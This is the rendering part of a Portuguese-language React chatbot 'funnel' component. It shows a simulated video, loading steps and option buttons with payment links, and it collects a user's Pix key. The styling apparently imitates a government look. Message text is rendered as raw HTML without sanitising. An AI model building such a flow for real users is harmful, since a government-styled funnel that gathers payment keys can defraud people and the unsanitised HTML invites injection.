    setShowVideoPlaceholderOverlay(false);
    setIsBotTyping(true);

    if (stepConfig.nextStep) {
        handleUserActionAndNavigate(stepConfig.nextStep as string);
    } else {
        setIsBotTyping(false);
    }
  };

  const handleTextInputFormSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (!currentTextInputConfig || !textInputValue.trim()) {
        const tempMsgId = `err-input-${Date.now()}`;
        setMessages(prev => [...prev, {id: tempMsgId, sender: 'bot', text: "Por favor, preencha o campo."}]);
        setTimeout(() => setMessages(prev => prev.filter(m => m.id !== tempMsgId)), 2000);
        return;
    }

    setMessages(prev => [...prev, { id: `user-input-${Date.now()}`, sender: 'user', text: textInputValue }]);
    setIsTextInputActive(false);
    setIsBotTyping(true);

    if (currentTextInputConfig.variableToSet === 'chavePix') {
        setFlowVariables(prev => ({...prev, chavePix: textInputValue.trim()}));
    }
    setTextInputValue("");

    const nextStepKey = (funnelDefinition.steps[currentStepKey as keyof typeof funnelDefinition.steps] as FlowStep)?.nextStep;
    if (nextStepKey) {
        handleUserActionAndNavigate(nextStepKey);
    } else {
        setIsBotTyping(false);
    }
  };

  const getIconComponent = (iconName?: string) => {
    if (!iconName) return null;
    if (iconName.includes('success_checkmark')) return <CheckCircle size={20} style={{ color: '#27AE60', marginRight: '8px', verticalAlign: 'bottom', flexShrink: 0 }} />;
    if (iconName.includes('warning_amber')) return <AlertTriangle size={20} style={{ color: '#F7B731', marginRight: '8px', verticalAlign: 'bottom', flexShrink: 0 }} />;
    if (iconName.includes('currency_dollar_gov_style')) {
      return <span style={{fontSize: '20px', marginRight: '8px', verticalAlign: 'bottom', flexShrink: 0, filter: 'grayscale(1) brightness(0.8)'}}>💰</span>;
    }
    return null;
  }


  return (
    <div className="simulated-chat-container" style={{ height: '100%', overflowY: 'auto', display: 'flex', flexDirection: 'column', padding: '10px', backgroundColor: '#f0f0f0' }}>
      <audio ref={audioRef} style={{ display: 'none' }} />

      {videoPlaceholderData.current && !isBotTyping && !isLoadingStep && (
        <div className="intro-video-section" style={{ marginBottom: '15px', padding: '10px', background: '#fff', borderRadius: '8px', boxShadow: '0 2px 10px rgba(0,0,0,0.1)' }}>
          {currentVideoMessage && <p className="bot-message" style={{ background: '#e9ecef', color: '#333', borderRadius: '12px', boxShadow: 'none', padding: '10px 15px', marginBottom: '10px', whiteSpace: 'pre-line' }}>{currentVideoMessage}</p>}
          <div
            onClick={handleVideoThumbnailClick}
            className="video-placeholder-wrapper"
            style={{
              position: 'relative', width: '100%', aspectRatio: '16/9',
              margin: '0 auto', borderRadius: '8px', overflow: 'hidden',
              backgroundColor: '#333', cursor: 'pointer', display: 'flex', justifyContent: 'center', alignItems: 'center'
            }}
          >
            {showVideoPlaceholderOverlay && (
              <div
                style={{
                  position: 'absolute', top: 0, left: 0, right: 0, bottom: 0,
                  background: 'rgba(0,0,0,0.6)', display: 'flex', flexDirection: 'column',
                  justifyContent: 'center', alignItems: 'center', color: 'white', zIndex: 10
                }}
              >
                <VolumeX size={48} />
                <span style={{ marginTop: '10px', fontSize: '18px', textAlign: 'center' }}>
                  {formatText(videoPlaceholderData.current?.thumbnailText)}
                </span>
              </div>
            )}
             { !showVideoPlaceholderOverlay && <span style={{color: 'white'}}>Vídeo Iniciado (Simulado)</span> }
          </div>
        </div>
      )}


      {isLoadingStep && loadingMessage && !isBotTyping && (
        <div className="loading-step-container" style={{ textAlign: 'center', padding: '20px', background: '#fff', borderRadius: '8px', margin: '10px 0', boxShadow: '0 2px 10px rgba(0,0,0,0.1)'}}>
          <Loader2 className="animate-spin" size={32} style={{ margin: '0 auto 10px auto', color: '#1451b4' }} />
          <p style={{ fontSize: '16px', color: '#333', whiteSpace: 'pre-line' }}>{loadingMessage}</p>
        </div>
      )}

      {currentImageDetails && !isBotTyping && !isLoadingStep && (
        <div className="message-container bot-message-container image-display-block">
          <div className="message bot-message" style={{ padding: '5px' }}>
            {currentImageDetails.message && <p style={{ marginBottom: '8px', padding: '5px 10px', whiteSpace: 'pre-line'}}>{currentImageDetails.message}</p>}
            <Image
              src={currentImageDetails.url}
              alt={currentImageDetails.alt}
              width={300}
              height={200}
              data-ai-hint={currentImageDetails.aiHint || "illustration"}
              style={{ borderRadius: '8px', maxWidth: '100%', height: 'auto', display: 'block' }}
            />
          </div>
        </div>
      )}


      {currentDisplayMessage && !isLoadingStep && !isBotTyping && (
        <div className={`message-container bot-message-container display-message-block`} style={{alignSelf: 'flex-start', maxWidth: '90%', width: 'auto', display: 'flex'}}>
           <div className="message bot-message" style={{width: 'auto', maxWidth: '100%'}}>
              {currentDisplayMessage.displayTitle && <h3 style={{ fontWeight: 'bold', marginBottom: '8px', fontSize: '17px', color: '#0056b3', display: 'flex', alignItems: 'center' }}>
                {getIconComponent(currentDisplayMessage.displayIcon)}
                <span dangerouslySetInnerHTML={{ __html: currentDisplayMessage.displayTitle }} />
              </h3>}
              {currentDisplayMessage.text && <p style={{ marginBottom: currentDisplayMessage.displayDetails ? '12px' : '0', whiteSpace: 'pre-line' }} dangerouslySetInnerHTML={{__html: currentDisplayMessage.text}} />}
              {currentDisplayMessage.displayDetails && (
                <div className="details-grid" style={{ borderTop: '1px solid #e0e0e0', paddingTop: '10px', display: 'grid', gridTemplateColumns: 'auto 1fr', gap: '6px 12px', fontSize: '14px' }}>
                  {Object.entries(currentDisplayMessage.displayDetails).map(([key, value]) => (
                    <React.Fragment key={key}>
                      <span style={{ fontWeight: '500', color: '#555' }} dangerouslySetInnerHTML={{__html: key}}/>
                      <span style={{ color: '#333' }} dangerouslySetInnerHTML={{__html: value}}/>
                    </React.Fragment>
                  ))}
                </div>
              )}
               { (currentDisplayMessage.displayIcon && (funnelDefinition.steps[currentStepKey as keyof typeof funnelDefinition.steps]?.data as FlowStepDataDisplayMessage)?.note) && (
                <p style={{fontSize: '12px', color: '#666', marginTop: '10px', borderTop: '1px dashed #ddd', paddingTop: '8px'}}>
                    <strong>Nota:</strong> {formatText(((funnelDefinition.steps[currentStepKey as keyof typeof funnelDefinition.steps] as FlowStep).data as FlowStepDataDisplayMessage)?.note)}
                </p>
              )}
           </div>
        </div>
      )}

      {messages.map((msg) => (
          <div key={msg.id} className={`message-container ${msg.sender === 'bot' ? 'bot-message-container' : 'user-message-container'}`}>
            <div className={`message ${msg.sender === 'bot' ? 'bot-message' : 'user-message'}`}>
              {msg.text && <span style={{whiteSpace: 'pre-line'}} dangerouslySetInnerHTML={{__html: msg.text}} />}
              {msg.sender === 'bot' && msg.options &&
               !isBotTyping && !isTextInputActive &&
               !videoPlaceholderData.current && !isLoadingStep &&
               !currentDisplayMessage && !currentImageDetails && (
                <div className="options-container">
                  {msg.options.map(opt => (
                    <button
                      key={opt.text + (opt.nextStep || '') + (opt.action || '') + (opt.paymentUrl || '')}
                      onClick={() => handleOptionClick(opt)}
                      className={`chat-option-button ${opt.style || ''}`}
                       dangerouslySetInnerHTML={{__html: opt.text}}
                    />
                  ))}
                </div>
              )}
            </div>
          </div>
        )
      )}

      {isTextInputActive && currentTextInputConfig && !isBotTyping && (
        <form onSubmit={handleTextInputFormSubmit} className="chat-input-form-container" style={{ display: 'flex', marginTop: '10px', padding: '5px', background: '#fff', borderRadius: '8px', boxShadow: '0 2px 10px rgba(0,0,0,0.1)' }}>
          <input
            type="text"
            value={textInputValue}
            onChange={(e) => setTextInputValue(e.target.value)}
            placeholder={formatText(currentTextInputConfig.placeholder)}
            className="chat-text-input"
            style={{ flexGrow: 1, border: '1px solid #ccc', borderRadius: '15px', padding: '10px 15px', marginRight: '8px', fontSize: '15px' }}
            autoFocus
          />
          <button type="submit" className="chat-send-button" style={{ background: '#1451b4', color: 'white', border: 'none', borderRadius: '50%', width: '40px', height: '40px', display: 'flex', alignItems: 'center', justifyContent: 'center', cursor: 'pointer' }}>
            <Send size={20} />
          </button>
        </form>
      )}

      {isBotTyping && (
         <div className="message-container bot-message-container">
            <div className="message bot-message typing-indicator">
                <span className="dot"></span><span className="dot"></span><span className="dot"></span>
            </div>
        </div>
      )}
      <div ref={chatEndRef} />
      <style jsx>{`
        .simulated-chat-container::-webkit-scrollbar { display: none; }
        .simulated-chat-container { -ms-overflow-style: none; scrollbar-width: none; }

        .message-container {
          display: flex;
          margin-bottom: 12px;
          max-width: 90%;
        }
        .bot-message-container {
          align-self: flex-start;
        }
        .user-message-container {
          align-self: flex-end;
          flex-direction: row-reverse;
        }

        .message {
          padding: 10px 15px;
          border-radius: 18px;
          line-height: 1.4;
          font-size: 15px;
          word-wrap: break-word;
          box-shadow: 0 1px 2px rgba(0,0,0,0.1);
          width: auto;
          max-width: 100%;
        }
        .bot-message {
          background-color: #e9ecef;
          color: #333;
          border-bottom-left-radius: 4px;
        }
        .user-message {
          background-color: #007bff;
          color: white;
          border-bottom-right-radius: 4px;
          margin-left: auto;
        }

        .options-container {
          margin-top: 10px;
          display: flex;
          flex-wrap: wrap;
          align-items: flex-start;
          justify-content: flex-start;
          gap: 8px;
        }
        .chat-option-button {
          background-color: #007bff;
          color: white;
          border: none;
          padding: 10px 20px;
          border-radius: 25px;
          cursor: pointer;
          font-size: 15px;
          font-weight: 500;
          transition: background-color 0.2s;
          text-align: center;
          box-shadow: 0 2px 4px rgba(0,0,0,0.1);
        }
        .chat-option-button:hover {
          background-color: #0056b3;
        }
        .chat-option-button.primary_cta_button_gov_style {
          background-color: #16a34a;
          border-color: #16a34a;
          color: white;
          font-weight: bold;
        }
        .chat-option-button.primary_cta_button_gov_style:hover {
          background-color: #15803d;
          border-color: #15803d;
        }
        .chat-option-button.secondary_link_button_gov_style {
          background-color: transparent;
          border: none;
          color: #007bff;
          text-decoration: underline;
          padding: 4px 0;
          box-shadow: none;
          font-size: 14px;
        }
        .chat-option-button.secondary_link_button_gov_style:hover {
          color: #0056b3;
          background-color: transparent;
        }
         .chat-option-button.destructive_link_button_gov_style {
          background-color: transparent;
          border: none;
          color: #dc3545;
          text-decoration: underline;
          padding: 4px 0;
          box-shadow: none;
          font-size: 14px;
        }
        .chat-option-button.destructive_link_button_gov_style:hover {
          color: #c82333;
          background-color: transparent;
        }


        .typing-indicator {
          display: inline-flex;
          align-items: center;
          padding: 10px 15px;
        }
        .typing-indicator .dot {
          width: 8px;
          height: 8px;
          margin: 0 2px;
          background-color: #aaa;
          border-radius: 50%;
          animation: bounce 1.4s infinite;
        }
        .typing-indicator .dot:nth-child(2) { animation-delay: 0.2s; }
        .typing-indicator .dot:nth-child(3) { animation-delay: 0.4s; }

        @keyframes bounce {
          0%, 80%, 100% { transform: scale(0); }
          40% { transform: scale(1); }
        }
        .display-message-block .bot-message {
            width: auto;
            max-width: 100%;
        }
      `}</style>
    </div>
  );
};

export default SimulatedChatFlow;
